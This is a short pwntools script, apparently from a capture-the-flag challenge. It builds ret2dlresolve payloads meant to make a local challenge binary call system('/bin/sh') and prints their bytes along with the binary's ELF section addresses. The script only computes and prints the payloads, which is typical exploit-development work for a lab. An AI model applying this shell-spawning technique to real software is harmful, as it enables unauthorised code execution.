#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF("/work/waf/waf/chal", checksec=False)
context.arch = 'amd64'

for base in [0x404410, 0x404420, 0x404500, 0x404600]:
    try:
        dl = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"], data_addr=base)
        print("data_addr=", hex(base))
        print("  reloc_index =", dl.reloc_index, hex(dl.reloc_index))
        print("  data_addr   =", hex(dl.data_addr))
        print("  payload len =", len(dl.payload))
        print("  payload hex =", dl.payload.hex())
        print("  _reloc off  =", hex(getattr(dl,'_reloc_addr',0)) if hasattr(dl,'_reloc_addr') else 'n/a')
    except Exception as e:
        print("data_addr=", hex(base), "ERROR", e)
    print()
# also show relevant addresses
print("JMPREL/.rela.plt:", hex(elf.get_section_by_name('.rela.plt').header.sh_addr))
print(".dynsym:", hex(elf.get_section_by_name('.dynsym').header.sh_addr))
print(".dynstr:", hex(elf.get_section_by_name('.dynstr').header.sh_addr))
print("plt0:", hex(elf.get_section_by_name('.plt').header.sh_addr))
